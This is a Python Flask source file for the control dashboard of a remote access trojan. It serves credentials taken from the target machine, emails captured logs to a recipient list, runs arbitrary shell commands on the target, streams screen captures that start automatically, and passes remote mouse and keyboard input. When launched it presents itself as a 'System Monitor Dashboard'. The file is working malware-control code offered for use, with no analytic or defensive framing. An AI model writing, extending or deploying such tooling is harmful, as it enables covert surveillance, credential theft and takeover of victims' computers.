#!/usr/bin/env python3
"""
RAT Dashboard - Flask Web Application
Admin interface for managing the RAT
"""

import os
import sys
import json
import io
import base64
from datetime import datetime
from flask import Flask, render_template, request, jsonify, session, redirect, url_for, send_file
from flask_socketio import SocketIO, emit

# Add parent directory to path
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from rat_agent.config import Config
from rat_agent.database import (
    get_recipients, add_recipient, toggle_recipient,
    get_logs, get_system_info, get_commands, get_credentials,
    delete_old_logs
)
from rat_agent.emailer import EmailSender
from rat_agent.logger import LogCapture

app = Flask(__name__)
app.secret_key = 'rat_dashboard_secret_key_2024_change_in_production'
config = Config()
emailer = EmailSender(config)
logger = LogCapture(config)

# Initialize SocketIO for real-time screen sharing
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading')

# Import and initialize remote screen
from rat_agent.screen import RemoteScreen
remote_screen = RemoteScreen(config)

# Start screen capture automatically when dashboard starts
def start_screen_on_load():
    """Start screen capture when first client connects"""
    import threading
    def delayed_start():
        import time
        time.sleep(3)  # Wait for dashboard to fully load
        print("[+] Auto-starting screen capture...")
        remote_screen.start(socketio)
    threading.Thread(target=delayed_start, daemon=True).start()

# Schedule auto-start
import threading
threading.Thread(target=start_screen_on_load, daemon=True).start()

# Login required decorator
def login_required(f):
    from functools import wraps
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'logged_in' not in session:
            return redirect(url_for('login'))
        return f(*args, **kwargs)
    return decorated_function

@app.route('/')
def index():
    """Dashboard home page"""
    if 'logged_in' not in session:
        return redirect(url_for('login'))
    return render_template('index.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    """Login page"""
    if request.method == 'POST':
        username = request.form.get('username', '')
        password = request.form.get('password', '')
        
        if username == config.DASHBOARD_USERNAME and password == config.DASHBOARD_PASSWORD:
            session['logged_in'] = True
            return jsonify({'success': True})
        
        return jsonify({'success': False, 'message': 'Invalid credentials'}), 401
    
    return render_template('login.html')

@app.route('/logout')
def logout():
    """Logout"""
    session.pop('logged_in', None)
    return redirect(url_for('login'))

@app.route('/api/recipients', methods=['GET'])
@login_required
def api_get_recipients():
    """Get all recipients"""
    recipients = []
    try:
        import sqlite3
        from rat_agent.database import get_db_connection
        conn = get_db_connection()
        cursor = conn.cursor()
        cursor.execute('SELECT id, email, active, added_at FROM recipients')
        for row in cursor.fetchall():
            recipients.append({
                'id': row[0],
                'email': row[1],
                'active': bool(row[2]),
                'added_at': row[3]
            })
        conn.close()
    except Exception as e:
        return jsonify({'error': str(e)}), 500
    
    return jsonify(recipients)

@app.route('/api/recipients', methods=['POST'])
@login_required
def api_add_recipient():
    """Add a new recipient"""
    data = request.get_json()
    email = data.get('email', '').strip()
    
    if not email:
        return jsonify({'success': False, 'message': 'Email required'}), 400
    
    if add_recipient(email):
        # Notify all recipients
        emailer.send_new_recipient_notification(email)
        return jsonify({'success': True, 'message': 'Recipient added'})
    else:
        return jsonify({'success': False, 'message': 'Email already exists'}), 400

@app.route('/api/recipients/<int:recipient_id>', methods=['PUT'])
@login_required
def api_update_recipient(recipient_id):
    """Update recipient status"""
    data = request.get_json()
    active = data.get('active', True)
    
    try:
        import sqlite3
        from rat_agent.database import get_db_connection
        conn = get_db_connection()
        cursor = conn.cursor()
        cursor.execute('UPDATE recipients SET active = ? WHERE id = ?', (active, recipient_id))
        conn.commit()
        conn.close()
        return jsonify({'success': True})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/recipients/<int:recipient_id>', methods=['DELETE'])
@login_required
def api_delete_recipient(recipient_id):
    """Delete a recipient"""
    try:
        import sqlite3
        from rat_agent.database import get_db_connection
        conn = get_db_connection()
        cursor = conn.cursor()
        cursor.execute('DELETE FROM recipients WHERE id = ?', (recipient_id,))
        conn.commit()
        conn.close()
        return jsonify({'success': True})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/logs', methods=['GET'])
@login_required
def api_get_logs():
    """Get captured logs"""
    limit = request.args.get('limit', 50, type=int)
    logs = get_logs(limit)
    
    result = []
    for log in logs:
        result.append({
            'id': log['id'],
            'preview': log['log_data'][:200] if log['log_data'] else '',
            'captured_at': log['captured_at'],
            'sent': bool(log['sent']),
            'full_data': log['log_data']
        })
    
    return jsonify(result)

@app.route('/api/logs/<int:log_id>', methods=['GET'])
@login_required
def api_get_log(log_id):
    """Get a specific log"""
    try:
        import sqlite3
        from rat_agent.database import get_db_connection
        conn = get_db_connection()
        cursor = conn.cursor()
        cursor.execute('SELECT * FROM logs WHERE id = ?', (log_id,))
        log = cursor.fetchone()
        conn.close()
        
        if log:
            return jsonify({
                'id': log['id'],
                'log_data': log['log_data'],
                'captured_at': log['captured_at'],
                'sent': bool(log['sent'])
            })
        return jsonify({'error': 'Log not found'}), 404
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/logs/capture', methods=['POST'])
@login_required
def api_capture_logs():
    """Trigger immediate log capture"""
    try:
        logs = logger.capture()
        from rat_agent.database import save_log
        save_log(logs)
        
        if emailer.send_logs(logs):
            return jsonify({'success': True, 'message': 'Logs captured and sent'})
        else:
            return jsonify({'success': True, 'message': 'Logs captured but not sent'})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/system', methods=['GET'])
@login_required
def api_get_system():
    """Get system information"""
    info = get_system_info()
    
    if info:
        return jsonify({
            'hostname': info.get('hostname'),
            'os_info': info.get('os_info'),
            'ip_address': info.get('ip_address'),
            'username': info.get('username'),
            'captured_at': info.get('captured_at')
        })
    
    # Get fresh info
    try:
        import socket
        import platform
        import getpass
        
        return jsonify({
            'hostname': socket.gethostname(),
            'os_info': f"{platform.system()} {platform.release()}",
            'ip_address': socket.gethostbyname(socket.gethostname()),
            'username': getpass.getuser()
        })
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/commands', methods=['GET'])
@login_required
def api_get_commands():
    """Get executed commands"""
    limit = request.args.get('limit', 50, type=int)
    commands = get_commands(limit)
    return jsonify(commands)

@app.route('/api/credentials', methods=['GET'])
@login_required
def api_get_credentials():
    """Get captured credentials"""
    creds = get_credentials()
    return jsonify(creds)

@app.route('/api/cleanup', methods=['POST'])
@login_required
def api_cleanup():
    """Clean up old logs"""
    days = request.args.get('days', 7, type=int)
    deleted = delete_old_logs(days)
    return jsonify({'success': True, 'deleted': deleted})

@app.route('/api/test-email', methods=['POST'])
@login_required
def api_test_email():
    """Send test email"""
    data = request.get_json()
    test_email = data.get('email')
    
    if emailer.send_test_email(test_email):
        return jsonify({'success': True})
    return jsonify({'success': False, 'message': 'Failed to send test email'}), 500

@app.route('/api/send-url', methods=['POST'])
@login_required
def api_send_url():
    """Send dashboard URL to all recipients"""
    data = request.get_json()
    url = data.get('url', '')
    
    if emailer.send_dashboard_url(url):
        return jsonify({'success': True})
    return jsonify({'success': False}), 500

# Command Execution API
@app.route('/api/execute', methods=['POST'])
@login_required
def api_execute_command():
    """Execute a command on the target system"""
    data = request.get_json()
    command = data.get('command', '')
    
    if not command:
        return jsonify({'error': 'Command required'}), 400
    
    try:
        import subprocess
        result = subprocess.run(
            command,
            shell=True,
            capture_output=True,
            text=True,
            timeout=30
        )
        output = result.stdout + result.stderr
        
        # Save to command history
        from rat_agent.database import save_command
        save_command(command, output[:5000])
        
        return jsonify({
            'success': True,
            'output': output[:10000],
            'return_code': result.returncode
        })
    except subprocess.TimeoutExpired:
        return jsonify({'success': False, 'output': 'Command timed out (30s limit)'}), 408
    except Exception as e:
        return jsonify({'success': False, 'output': str(e)}), 500

# SocketIO Event Handlers
@socketio.on('connect')
def handle_connect():
    print(f"[+] Client connected: {request.sid}")
    # Send current screen if available
    if remote_screen.last_screenshot:
        emit('screen_update', {
            'image': base64.b64encode(remote_screen.last_screenshot).decode(),
            'timestamp': datetime.now().isoformat()
        })

@socketio.on('disconnect')
def handle_disconnect():
    print(f"[-] Client disconnected: {request.sid}")

@socketio.on('move_mouse')
def handle_move_mouse(data):
    """Handle mouse movement from client"""
    x = data.get('x', 0)
    y = data.get('y', 0)
    remote_screen.move_mouse(x, y)
    # Broadcast to all clients
    socketio.emit('mouse_position', {'x': x, 'y': y})

@socketio.on('click_mouse')
def handle_click_mouse(data):
    """Handle mouse click from client"""
    button = data.get('button', 'left')
    x = data.get('x')
    y = data.get('y')
    
    # Click at specific position or current position
    if x is not None and y is not None:
        remote_screen.click_mouse(button, x, y)
    else:
        remote_screen.click_mouse(button)
    
    socketio.emit('mouse_clicked', {'button': button, 'x': x, 'y': y})

@socketio.on('type_text')
def handle_type_text(data):
    """Handle text typing from client"""
    text = data.get('text', '')
    remote_screen.type_text(text)
    socketio.emit('text_typed', {'text': text})

@socketio.on('double_click')
def handle_double_click(data):
    """Handle double click from client"""
    x = data.get('x')
    y = data.get('y')
    remote_screen.double_click(x, y)
    socketio.emit('mouse_double_clicked', {'x': x, 'y': y})

@socketio.on('start_screen')
def handle_start_screen():
    """Start screen capture"""
    remote_screen.start(socketio)
    socketio.emit('screen_started', {'status': 'started'})

@socketio.on('stop_screen')
def handle_stop_screen():
    """Stop screen capture"""
    remote_screen.stop()
    socketio.emit('screen_stopped', {'status': 'stopped'})

# API Routes for Screen Control
@app.route('/api/screen/info', methods=['GET'])
@login_required
def api_screen_info():
    """Get screen information"""
    return jsonify(remote_screen.get_screen_info())

@app.route('/api/screen/capture', methods=['POST'])
@login_required
def api_capture_screen():
    """Capture current screen"""
    screenshot = remote_screen._capture_screen()
    if screenshot:
        return send_file(io.BytesIO(screenshot), mimetype='image/jpeg')
    return jsonify({'error': 'Capture failed'}), 500

@app.errorhandler(404)
def not_found(e):
    return jsonify({'error': 'Not found'}), 404

@app.errorhandler(500)
def server_error(e):
    return jsonify({'error': 'Internal server error'}), 500

if __name__ == '__main__':
    print(f"Starting System Monitor Dashboard on {config.DASHBOARD_HOST}:{config.DASHBOARD_PORT}")
    socketio.run(
        app,
        host=config.DASHBOARD_HOST,
        port=config.DASHBOARD_PORT,
        debug=False,
        allow_unsafe_werkzeug=True
    )
